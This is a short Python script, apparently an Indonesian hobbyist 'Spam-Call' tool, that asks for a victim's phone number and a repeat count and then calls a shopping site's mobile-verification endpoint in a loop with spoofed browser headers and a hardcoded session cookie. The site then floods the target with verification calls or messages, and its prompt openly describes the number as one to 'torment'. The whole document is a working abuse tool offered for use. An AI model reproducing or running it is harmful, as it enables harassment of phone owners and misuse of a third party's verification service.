import requests,json,os,time

os.system("clear")

print("Subscribe Chanel Gua ")
os.system("xdg-open  https://youtube.com/channel/UCXJb46cD3NHY87EBV6lUulA")
time.sleep(5)
os.system("clear")
banner = """
\tS p a m - C a l l
\t------------------
|-----------------------------|
|[☆] Creator  : DARK NIGHT    |
|[☆] Youtube  : Termux ID     |
|-----------------------------|
Masukan awalan nomor dengan angka 8 !!
Contoh: 895xxxxxxxx
"""
print(banner)

nomor = input("[+] Nomor Yang Mau Anda Siksa : ")

jumlah = int(input("[+] Jumlah Siksaan : "))


ua = {
"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Accept":"*/*",
"User-Agent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gec",
"X-Requested-With":"XMLHttpRequest",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
'Cookie':'PHPSESSID=oiu2egn30mdqbt42oqfeoluaes; DAPROPS="sjs.webGlRenderer:Mali-T720|bjs.acces',
}

url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  req = requests.get(url,headers=ua).text
  exz = json.loads(req)
  xx = exz["result"]
  xn = exz ["message"]
  print(f"Result: {xx}, Message: {xn}")
  time.sleep(10)
